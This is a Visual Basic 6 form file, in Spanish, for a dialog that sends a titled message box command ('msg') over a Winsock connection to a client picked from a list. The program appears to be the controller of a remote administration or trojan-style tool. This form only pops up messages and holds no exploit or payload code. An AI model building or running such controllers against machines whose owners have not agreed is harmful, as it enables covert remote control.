VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Object = "{F8180939-60A2-4494-B1BB-04818D7F640B}#1.0#0"; "LabelDegradado.ocx"
Begin VB.Form fmensaje 
   Caption         =   "Mensaje"
   ClientHeight    =   3495
   ClientLeft      =   9720
   ClientTop       =   3255
   ClientWidth     =   5835
   LinkTopic       =   "Form5"
   MaxButton       =   0   'False
   ScaleHeight     =   3495
   ScaleWidth      =   5835
   Begin VB.CommandButton Command3 
      Caption         =   "&Testear"
      Height          =   375
      Left            =   4200
      TabIndex        =   11
      Top             =   2040
      Width           =   1575
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&Cerrar"
      Height          =   375
      Left            =   4200
      TabIndex        =   10
      Top             =   3000
      Width           =   1575
   End
   Begin LabelDegradado.LabelDegrade LabelDegrade3 
      Height          =   255
      Left            =   4200
      TabIndex        =   9
      Top             =   120
      Width           =   1575
      _ExtentX        =   2778
      _ExtentY        =   450
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Text            =   "&Tipo de mensaje"
      BackColor       =   255
      Transparente    =   0   'False
      ShadowDepth     =   0
      ShadowStyle     =   0
      ShadowColorStart=   0
      DegradadoColorStart=   8388608
   End
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   5640
      OleObjectBlob   =   "fmensaje.frx":0000
      Top             =   480
   End
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   5640
      Top             =   1080
   End
   Begin VB.OptionButton Normal 
      Caption         =   "&Normal"
      Height          =   195
      Left            =   4320
      TabIndex        =   8
      Top             =   1680
      Width           =   1215
   End
   Begin VB.OptionButton Exclamacion 
      Caption         =   "&Exclamacion"
      Height          =   195
      Left            =   4320
      TabIndex        =   7
      Top             =   1320
      Width           =   1215
   End
   Begin VB.OptionButton Error 
      Caption         =   "&Error"
      Height          =   195
      Left            =   4320
      TabIndex        =   6
      Top             =   960
      Width           =   1215
   End
   Begin VB.OptionButton Informacion 
      Caption         =   "&Informacion"
      Height          =   195
      Left            =   4320
      TabIndex        =   5
      Top             =   600
      Value           =   -1  'True
      Width           =   1215
   End
   Begin VB.TextBox title 
      Height          =   285
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   3
      Top             =   480
      Width           =   3975
   End
   Begin LabelDegradado.LabelDegrade LabelDegrade1 
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   840
      Width           =   3975
      _ExtentX        =   7011
      _ExtentY        =   450
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Text            =   "&Mensaje"
      BackColor       =   255
      Transparente    =   0   'False
      ShadowDepth     =   0
      ShadowStyle     =   0
      ShadowColorStart=   0
      DegradadoColorStart=   8388608
   End
   Begin VB.TextBox msg 
      Height          =   2175
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   1
      Top             =   1200
      Width           =   3975
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Enviar mensaje"
      Height          =   375
      Left            =   4200
      TabIndex        =   0
      Top             =   2520
      Width           =   1575
   End
   Begin LabelDegradado.LabelDegrade LabelDegrade2 
      Height          =   255
      Left            =   120
      TabIndex        =   4
      Top             =   120
      Width           =   3975
      _ExtentX        =   7011
      _ExtentY        =   450
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Text            =   "&Titulo"
      BackColor       =   255
      Transparente    =   0   'False
      ShadowDepth     =   0
      ShadowStyle     =   0
      ShadowColorStart=   0
      DegradadoColorStart=   8388608
   End
End
Attribute VB_Name = "fmensaje"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function PathFileExists Lib "shlwapi" Alias "PathFileExistsA" (ByVal lppath As String) As Boolean
Private Declare Function MessageBox Lib "user32" Alias "MessageBoxA" (ByVal hwnd As Long, ByVal message As String, ByVal title As String, ByVal utype As Integer) As Integer

Dim vIndex As Variant
Dim Index_n As Integer
Dim tipo As Integer

Dim MyForm As FRMSIZE
Dim DesignX As Integer
Dim DesignY As Integer

Private Sub Command1_Click()

If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    
    If Informacion.Value = True Then
        Error.Value = False
        Exclamacion.Value = False
        tipo = 64
    End If
    
    If Error.Value = True Then
        Informacion.Value = False
        Exclamacion.Value = False
        tipo = 16
    End If
    
    If Exclamacion.Value = True Then
        Error.Value = False
        Informacion.Value = False
        tipo = 48
    End If
    
    If Normal.Value = True Then
        Exclamacion.Value = False
        Error.Value = False
        Informacion.Value = False
        tipo = 0
    End If
    
    If Not msg.Text = "" And Not title.Text = "" Then
        Form1.Winsock1(vIndex(0)).SendData "msg" & msg.Text & "," & title.Text & "," & tipo
        lista.List1.ListItems.Add , , "[ Enviando mensaje " & msg.Text & " Titulo " & title.Text & " ]"
        msg = "" 'Reassignamos.
        title = ""
        msg.SetFocus
    End If
Else
    lista.List1.ListItems.Add , , "[Error al procesar comando - conexion perdida]"
    Unload Me
End If

End Sub

Private Sub Command2_Click()
Unload Me
End Sub

Private Sub Command3_Click()
    If Informacion.Value = True Then
        Error.Value = False
        Exclamacion.Value = False
        tipo = 64
    End If
    
    If Error.Value = True Then
        Informacion.Value = False
        Exclamacion.Value = False
        tipo = 16
    End If
    
    If Exclamacion.Value = True Then
        Error.Value = False
        Informacion.Value = False
        tipo = 48
    End If
    
    If Normal.Value = True Then
        Exclamacion.Value = False
        Error.Value = False
        Informacion.Value = False
        tipo = 0
    End If
    
    If Not msg.Text = "" And Not title.Text = "" Then
        MessageBox 0, msg.Text, title.Text, tipo
    End If
    
    msg.SetFocus
End Sub

Private Sub Form_Activate()
msg.SetFocus
End Sub

Private Sub Form_Resize()
    Dim ScaleFactorX As Single, ScaleFactorY As Single

      If Not DoResize Then
         DoResize = True
         Exit Sub
      End If

      RePosForm = False
      ScaleFactorX = Me.Width / MyForm.Width
      ScaleFactorY = Me.Height / MyForm.Height
      Resize_For_Resolution ScaleFactorX, ScaleFactorY, Me
      MyForm.Height = Me.Height
      MyForm.Width = Me.Width
End Sub

Private Sub Form_Load()
Index_n = (Form1.LV.SelectedItem.Index)
vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")

If PathFileExists(App.path & "\sk\skin.skn") Then
    Skin1.LoadSkin App.path & "\sk\skin.skn"
    Skin1.ApplySkin fmensaje.hwnd
End If

Dim ScaleFactorX As Single, ScaleFactorY As Single

DesignX = 800
DesignY = 600
RePosForm = True
DoResize = False

Xtwips = Screen.TwipsPerPixelX
Ytwips = Screen.TwipsPerPixelY
Ypixels = Screen.Height / Ytwips
Xpixels = Screen.Width / Xtwips

ScaleFactorX = ((Xpixels / DesignX) / 2) - 100
ScaleFactorY = ((Ypixels / DesignY) / 2) - 100
ScaleMode = 1

Resize_For_Resolution ScaleFactorX, ScaleFactorY, Me
MyForm.Height = Me.Height
MyForm.Width = Me.Width

End Sub

Private Sub Timer1_Timer()

If Not Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Unload Me
End If

End Sub
